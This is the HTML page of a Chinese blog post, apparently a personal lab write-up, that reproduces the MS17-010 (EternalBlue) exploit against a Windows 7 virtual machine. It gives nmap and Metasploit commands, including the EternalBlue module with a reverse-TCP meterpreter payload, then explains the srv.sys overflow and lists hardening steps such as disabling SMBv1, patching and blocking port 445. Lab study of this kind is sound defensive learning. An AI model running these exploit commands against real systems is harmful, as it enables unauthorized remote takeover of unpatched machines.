@@ -1,0 +1,68 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#f8f9f5"><meta name="description" content="在 Kali Linux 与 Windows 7 虚拟机环境中记录实验过程，并整理漏洞原理和系统加固方法。"><title>MS17-010 实验复现与防御笔记 · Hickercf&#39;blog</title><link rel="canonical" href="https://hickercf.fun/notes/ms17-010-lab/"><meta property="og:type" content="article"><meta property="og:title" content="MS17-010 实验复现与防御笔记 · Hickercf&#39;blog"><meta property="og:description" content="在 Kali Linux 与 Windows 7 虚拟机环境中记录实验过程，并整理漏洞原理和系统加固方法。"><meta property="og:url" content="https://hickercf.fun/notes/ms17-010-lab/"><meta name="twitter:card" content="summary"><meta property="article:published_time" content="2026-10-04"><meta property="article:author" content="木之风"><link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='10' fill='%234d6254'/%3E%3Cpath d='M12 10v20m16-20v20M12 20h16' stroke='%23f8f9f5' stroke-width='3' fill='none'/%3E%3C/svg%3E"><link rel="stylesheet" href="/styles.css"><script src="/app.js" defer></script></head><body id="top"><a class="skip-link" href="#main">跳至主要内容</a><header class="site-header"><div class="header-inner"><a class="brand" href="/" aria-label="Hickercf&#39;blog 首页"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 28 28"><path d="M7 6v16M21 6v16M7 14h14"/><path class="mark-detail" d="M11 4h6M11 24h6"/></svg></span><span>Hickercf&#39;blog</span></a><nav class="main-nav" aria-label="主导航"><a href="/" aria-current="page">文章</a><a href="/archives/" >归档</a><a href="/about/" >关于</a></nav><span class="header-note"><span class="status-dot"></span>持续记录中</span></div></header><main id="main" tabindex="-1"><article class="reader-container"><a class="back-link" href="/"><svg viewBox="0 0 20 20" fill="none" aria-hidden="true"><path d="M17 10H4m5-5-5 5 5 5" stroke="currentColor" stroke-width="1.25"/></svg>返回所有文章</a><header class="reader-heading"><a class="post-category" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"><span class="category-square" aria-hidden="true"></span>渗透学习</a><h1>MS17-010 实验复现与防御笔记</h1><div class="post-meta"><time datetime="2026-10-04">2026.10.04</time><span class="meta-dot" aria-hidden="true"></span><span>约 4 分钟阅读</span></div><p class="reader-excerpt">在 Kali Linux 与 Windows 7 虚拟机环境中记录实验过程，并整理漏洞原理和系统加固方法。</p></header><p class="source-note">整理自个人 Notion 笔记 · 原笔记更新于 <time datetime="2026-09-19">2026.09.19</time></p><details class="mobile-toc"><summary>文章目录 <span>6 个章节</span></summary><nav aria-label="文章章节"><a href="#section-1">实验环境和准备：</a><a href="#section-2">收集当前网络环境：</a><a href="#section-3">信息收集和漏洞扫描</a><a href="#section-4">启动 Metasploit 并配置利用模块：</a><a href="#section-5">漏洞技术原理深析 (MS17-010)</a><a href="#section-6">靶机加固与防御配置方案</a></nav></details><div class="reader-layout"><div><div class="reader-body" lang="zh-CN"><h3 id="section-1">实验环境和准备：</h3>
+<ul>
+<li>攻击机：Kali Linux 2026.2</li>
+<li>靶机 Windows 7 x64</li>
+<li>网络模式：确保攻击机和靶机在同一个局域网</li>
+</ul>
+<hr />
+<h3 id="section-2">收集当前网络环境：</h3>
+<p>Kali：<br /><img src="/assets/notion-ec719de6-9a04-4df6-858a-ea59c8369f87.png" alt="MS17-010 实验复现与防御笔记 · 原笔记截图 1" loading="lazy"><br />WIn7：<br /><img src="/assets/notion-c984578f-b318-46ab-a4f3-29ec19dc79ac.png" alt="MS17-010 实验复现与防御笔记 · 原笔记截图 2" loading="lazy"><br />确认两台机器在同一局域网内。在 Kali 中 ping 靶机，确认能 ping 通：<br /><img src="/assets/notion-599d8689-a784-41ca-90e9-3d3339eee92f.png" alt="MS17-010 实验复现与防御笔记 · 原笔记截图 3" loading="lazy"></p>
+<hr />
+<h3 id="section-3">信息收集和漏洞扫描</h3>
+<p>在 Kali 中运行 Nmap 扫描靶机的开放端口：</p>
+<pre class="note-code"><code class="language-bash">nmap -sS -O 192.168.221.136
+</code></pre>
+<p>确认开放了 445 端口：<br /><img src="/assets/notion-56b455db-c379-4541-94fe-2dc671040bdb.png" alt="MS17-010 实验复现与防御笔记 · 原笔记截图 4" loading="lazy"></p>
+<hr />
+<h3 id="section-4">启动 Metasploit 并配置利用模块：</h3>
+<p>在 Metasploit 控制台中，搜索永恒之蓝扫描模块，并且确认是否存在漏洞：</p>
+<pre class="note-code"><code class="language-bash">use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.221.136
+run
+</code></pre>
+<p>确认扫描到漏洞：<br /><img src="/assets/notion-fa81736e-1a1e-4231-a48d-c450aa1b8d30.png" alt="MS17-010 实验复现与防御笔记 · 原笔记截图 5" loading="lazy"><br />加载利用模块：</p>
+<pre class="note-code"><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.221.136
+set LHOST 192.168.221.135
+set payload windows/x64/meterpreter/reverse_tcp
+
+exploit
+</code></pre>
+<p>成功远程连接：<br /><img src="/assets/notion-b6b638f1-a93d-4953-aa59-9a349c77d7cd.png" alt="MS17-010 实验复现与防御笔记 · 原笔记截图 6" loading="lazy"></p>
+<hr />
+<h3 id="section-5">漏洞技术原理深析 (MS17-010)</h3>
+<p>MS17-010（CVE-2017-0144）是 Windows SMBv1 协议实现中的经典缓冲区溢出漏洞：</p>
+<ol>
+<li><strong>协议缺陷定位</strong><ul>
+<li>漏洞位于 Windows 内核驱动 <code>srv.sys</code>。</li>
+<li>该驱动负责解析并处理 SMBv1 协议的报文请求。</li>
+</ul>
+</li>
+<li><strong>数学与逻辑错误（整型越界与缓冲区溢出）</strong><ul>
+<li>当客户端向服务器发送扩展属性（Extended Attributes, FEA）请求时，会调用 <code>SrvOs2FeaListToNt</code> 函数将 OS/2 FEA 格式转换为 NT FEA 格式。</li>
+<li>在计算所需缓冲区大小时，系统对数据长度的处理存在逻辑缺陷：当输入的 FEA 列表长度超出预期（即 <code>FeaListSize</code> 发生整型回绕或计算溢出）时，分配给转换后数据的内核池缓冲区偏小。</li>
+<li>随后系统在执行数据复制时，超长的数据覆盖了相邻的内核池内存结构，从而造成内核池溢出（Pool Overflow）。</li>
+</ul>
+</li>
+<li><strong>安全危害</strong><ul>
+<li>攻击者构造特定格式的畸形 SMB 请求，无需经过身份认证即可破坏内核数据结构并劫持控制流，直接以操作系统的最高权限（<code>SYSTEM</code> 权限）执行代码。</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h3 id="section-6">靶机加固与防御配置方案</h3>
+<p>针对该实验中的第 5 部分防御要求，可以从协议禁用、系统补丁及边界防护三个维度实施加固：</p>
+<ol>
+<li><strong>彻底禁用过时的 SMBv1 协议</strong><br /><strong>GUI 方式</strong>：打开“控制面板” -&gt; “程序和功能” -&gt; “启用或关闭 Windows 功能”，找到并取消勾选 <strong>SMB 1.0/CIFS 文件共享支持</strong>，保存后重启系统。</li>
+<li><strong>安装安全更新补丁</strong><ul>
+<li>检查系统补丁列表，确认已安装针对 MS17-010 的安全补丁：<ul>
+<li>Windows 7 / Server 2008 R2 对应补丁号通常为 <strong>KB4012212</strong> 或 <strong>KB4012215</strong>。</li>
+</ul>
+</li>
+<li>可在命令行运行以下命令检查是否已修复：DOS<pre class="note-code"><code class="language-plain"></code></pre>
+</li>
+</ul>
+</li>
+</ol>
+<p>wmic qfe get hotfixid | findstr 4012212<br />```<br />3. <strong>网络与防火墙策略</strong><br />- 在网络边界设备及主机防火墙上阻断敏感端口入站流量：<br />- 禁用 TCP <strong>139</strong>、<strong>445</strong> 端口对不可信网络的开放。<br />- 仅允许内网受信任的网段或管理主机访问必要的文件共享服务。</p>
+</div><div class="reader-end"><p>写下来，是为了更好地理解。<br>— 木之风</p></div><a class="reader-next" href="/notes/penetration-learning/"><span>继续阅读 · 渗透学习</span><h2>渗透测试学习笔记：从基础到实践 <span aria-hidden="true">→</span></h2></a></div><aside class="reader-toc"><h2>文章目录</h2><nav aria-label="文章章节"><a href="#section-1">实验环境和准备：</a><a href="#section-2">收集当前网络环境：</a><a href="#section-3">信息收集和漏洞扫描</a><a href="#section-4">启动 Metasploit 并配置利用模块：</a><a href="#section-5">漏洞技术原理深析 (MS17-010)</a><a href="#section-6">靶机加固与防御配置方案</a></nav></aside></div></article></main><footer class="site-footer"><div class="footer-inner"><div><a class="footer-brand" href="/">Hickercf&#39;blog</a><p>用文字，留下一点痕迹。</p></div><div class="footer-right"><div class="footer-links"><a href="https://github.com/hickercf" target="_blank" rel="noopener noreferrer">GitHub ↗</a><a href="/about/">关于这里 ↗</a></div><span>© 2026 木之风 · Hickercf&#39;blog</span></div></div></footer><a class="back-to-top" href="#top" aria-label="返回顶部">↑</a></body></html>
